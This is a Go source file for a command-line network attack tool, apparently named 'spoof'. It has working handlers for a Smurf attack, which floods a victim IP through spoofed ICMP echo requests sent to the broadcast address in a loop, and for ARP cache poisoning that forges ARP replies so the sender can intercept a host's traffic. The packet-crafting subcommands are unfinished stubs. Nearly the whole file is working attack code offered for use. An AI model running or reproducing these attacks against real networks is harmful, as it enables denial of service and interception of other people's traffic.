package app

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/adrianosela/spoof/payloads"
	"github.com/adrianosela/spoof/wire"

	"github.com/pkg/errors"
	cli "gopkg.in/urfave/cli.v1"
)

var commands = []cli.Command{
	{
		Name:    "exec",
		Aliases: []string{"x"},
		Usage:   "execute an attack against a target host",
		Subcommands: []cli.Command{
			{
				Name:    "smurf",
				Aliases: []string{"s"},
				Usage:   "make a network overwhelm a host with ICMP Echo replies",
				Flags: []cli.Flag{
					asMandatory(targetFlag),
					withDefault(ifaceFlag, "en0"),
					withDefault(everyFlag, "1ms"),
				},
				Before: smurfValidator,
				Action: smurfHandler,
			},
			{
				Name:    "poison-arp",
				Aliases: []string{"a"},
				Usage:   "poison (spoof) a host's arp cache and read their traffic",
				Flags: []cli.Flag{
					asMandatory(srcIPFlag),
					asMandatory(dstIPFlag),
					asMandatory(dstMACFlag),
					withDefault(ifaceFlag, "en0"),
				},
				Before: arpPoisonValidator,
				Action: arpPoisonHandler,
			},
		},
	},
	{
		Name:    "craft",
		Aliases: []string{"c"},
		Usage:   "craft frames to be injected into the wire",
		Subcommands: []cli.Command{
			{
				Name:  "icmp",
				Usage: "craft icmp frames",
				Flags: []cli.Flag{
					// TODO: flags
				},
				// TODO: before and action
			},
			{
				Name:  "arp",
				Usage: "craft arp frames",
				Flags: []cli.Flag{
					// TODO: flags
				},
				// TODO: before and action
			},
		},
	},
}

func smurfValidator(ctx *cli.Context) error {
	return assertSet(ctx, targetFlag)
}

func smurfHandler(ctx *cli.Context) error {
	target := net.ParseIP(ctx.String(name(targetFlag)))
	if target == nil {
		return errors.New("invalid target IP address")
	}

	every, err := time.ParseDuration(ctx.String(name(everyFlag)))
	if err != nil {
		return errors.New("invalid time string given")
	}

	w, err := wire.NewWire(ctx.String(name(ifaceFlag)))
	if err != nil {
		return err
	}
	defer w.Close()

	ip, mask, err := w.IPv4()
	if err != nil {
		return err
	}
	broadcast := getBroadcastIPv4(ip, mask)

	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
		SrcIP:  target,
		DstIP:  broadcast,
		SrcMAC: w.MAC(),
		DstMAC: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
	})
	if err != nil {
		return errors.Wrap(err, "could not build payload")
	}

	banner := "Victim: %s\nUsing Broadcast: %s\nEvery: %s\nPayload:\n---\n%v---\n"
	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(payload))

	loop(every, func() {
		if err = w.Inject(payload); err != nil {
			log.Println(err)
		}
	})

	return nil
}

func arpPoisonValidator(ctx *cli.Context) error {
	return assertSet(ctx, srcIPFlag, dstIPFlag, dstMACFlag)
}

func arpPoisonHandler(ctx *cli.Context) error {
	srcIP := net.ParseIP(ctx.String(name(srcIPFlag)))
	if srcIP == nil {
		return errors.New("invalid source IP address")
	}

	dstIP := net.ParseIP(ctx.String(name(dstIPFlag)))
	if dstIP == nil {
		return errors.New("invalid destination IP address")
	}

	dstMAC, err := net.ParseMAC(ctx.String(name(dstMACFlag)))
	if err != nil {
		return errors.Wrap(err, "invalid destination MAC address")
	}

	w, err := wire.NewWire(ctx.String(name(ifaceFlag)))
	if err != nil {
		return err
	}
	defer w.Close()

	payload, err := payloads.Build(payloads.TypeARPReply, payloads.Config{
		SrcIP:  srcIP,   // the ip we are impersonating
		SrcMAC: w.MAC(), // advertised MAC i.e. **this** interface
		DstIP:  dstIP,   // ip of host having its arp cache poisoned
		DstMAC: dstMAC,  // mac of host having its arp cache poisoned
	})
	if err != nil {
		return errors.Wrap(err, "could not build payload")
	}

	if err = w.Inject(payload); err != nil {
		return errors.Wrap(err, "failed to inject payload")
	}

	return nil
}
